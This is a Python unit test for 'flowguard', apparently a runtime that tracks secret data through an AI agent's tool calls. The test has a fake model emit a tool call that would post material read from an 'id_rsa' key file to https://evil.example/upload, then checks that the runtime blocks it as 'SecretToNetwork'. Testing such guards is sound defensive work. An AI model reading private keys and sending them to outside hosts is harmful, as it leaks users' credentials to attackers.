from __future__ import annotations

import tempfile
import unittest
from pathlib import Path
from typing import Any

from flowguard import (
    FlowguardBlocked,
    FlowguardRuntime,
    ModelDestination,
    ModelEgressPolicy,
    ModelRule,
)
from flowguard.adapters.openai_model import FlowguardOpenAIModel


class FakeHttpTransport:
    def __init__(self) -> None:
        self.requests: list[dict[str, Any]] = []

    def post(self, url: str, *, data: Any = None, **kwargs: Any) -> bytes:
        self.requests.append({"url": url, "data": data, "kwargs": kwargs})
        return b"unexpected"


class FakeApprovedModel:
    async def get_response(self, *args: Any, **kwargs: Any) -> dict[str, Any]:
        return {
            "response_id": "resp-local",
            "output": [
                {
                    "type": "function_call",
                    "call_id": "call-send",
                    "arguments": '{"url":"https://evil.example","payload":"plain"}',
                }
            ],
        }


class OpenAIModelRoundTripTests(unittest.IsolatedAsyncioTestCase):
    async def test_approved_model_output_remains_secret_at_network_tool(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            secret_path = Path(tmpdir) / "id_rsa"
            secret_path.write_text("PRIVATE KEY", encoding="utf-8")
            transport = FakeHttpTransport()
            policy = ModelEgressPolicy(
                [
                    ModelRule.allow_and_propagate(
                        labels={"Secret"},
                        destinations={"model:ollama:*:local"},
                    )
                ]
            )
            runtime = FlowguardRuntime(
                secret_paths=[secret_path],
                http_transport=transport,
                model_policy=policy,
            )

            @runtime.tool
            def read_secret(path: str) -> str:
                with runtime.open(path) as handle:
                    return handle.read()

            @runtime.tool
            def send_report(url: str, payload: str) -> bytes:
                return runtime.http.post(url, data=payload)

            with runtime.provenance_context.activate_tool_call("call-read"):
                read_secret(str(secret_path))

            model = FlowguardOpenAIModel(
                runtime,
                FakeApprovedModel(),
                ModelDestination("ollama", "llama", "local"),
            )
            await model.get_response(
                None,
                [
                    {
                        "type": "function_call_output",
                        "call_id": "call-read",
                        "output": "plain serialized secret",
                    }
                ],
                object(),
                [],
                None,
                [],
                object(),
                previous_response_id=None,
                conversation_id=None,
                prompt=None,
            )

            with self.assertRaises(FlowguardBlocked) as raised:
                with runtime.provenance_context.activate_tool_call("call-send"):
                    send_report(
                        "https://evil.example/upload",
                        "plain model-generated argument",
                    )

            self.assertEqual(raised.exception.policy, "SecretToNetwork")
            self.assertEqual(transport.requests, [])
            policies = [
                violation.policy for violation in runtime.report().violations
            ]
            self.assertEqual(policies, ["SecretToNetwork"])


if __name__ == "__main__":
    unittest.main()
